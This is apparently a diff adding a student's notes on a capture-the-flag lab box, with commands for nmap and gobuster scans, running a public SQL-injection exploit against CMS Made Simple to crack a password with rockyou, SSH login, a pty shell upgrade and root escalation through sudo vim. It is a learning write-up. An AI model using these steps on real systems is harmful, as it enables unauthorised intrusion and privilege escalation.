@@ -1,0 +1,29 @@
+1/28/24
+1.) I need to find how many services are running on port 1000.
+	- I used nmap to scan the services on that port on that ip 
+		- nmap -sV -sC ip_address
+	- I found that there are two services on ports that are under 1000. 
+2.) ran gobuster to find hidden directories
+	- found a directory simple
+		- gobuster dir -u http://10.10.178.0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+3.) using searchsploit a command-likne search tool for exploiting a databnase. 
+	- since we found the terms made simple in the page source, we search in the command line, searchsploit "made simple" found a vulnerability or exploit that was useful which said sql injection.
+	- located the file, then copied it to my directory.
+	- opened file and found the cve.
+(vulnerability is called sqli) -u 
+4.) mv 46635.py exploit.py
+	- this would move my password cracker in python over, where i created a new folder called simplectf for all information.
+5.) ran pip install termcolor for past issues, then ran pip install 2to3
+	- after ran 2to3 . -w to change all python scripts to python3.
+6.) then finall ran my python script
+	- python exploit.py http://ip/simple --crack -w /usr/sharee/wordlists/rockyou.txt
+7.) got password and ssh into -> mitch ssh mitch@ip -p 2222
+	- found user.txt and got flag
+8.) to get privledge escalation we would use which
+	- which python3 to find the path of python3 to run python commands
+		- where we ran python3 -c 'import pty;pty.spawn("/bin/bash")' to create a new bash shell to get a fully interatice one
+9.) sudo -l to find all the commands with root privledges where we get /usr/bin/vim to escalate privileges.
+	- sudo vim, then :shell to drop the user into the root shell.
+		- use id to check for id's lol -> root
+10.) cd /root then ls to find root.txt to find the last flag!!!!!
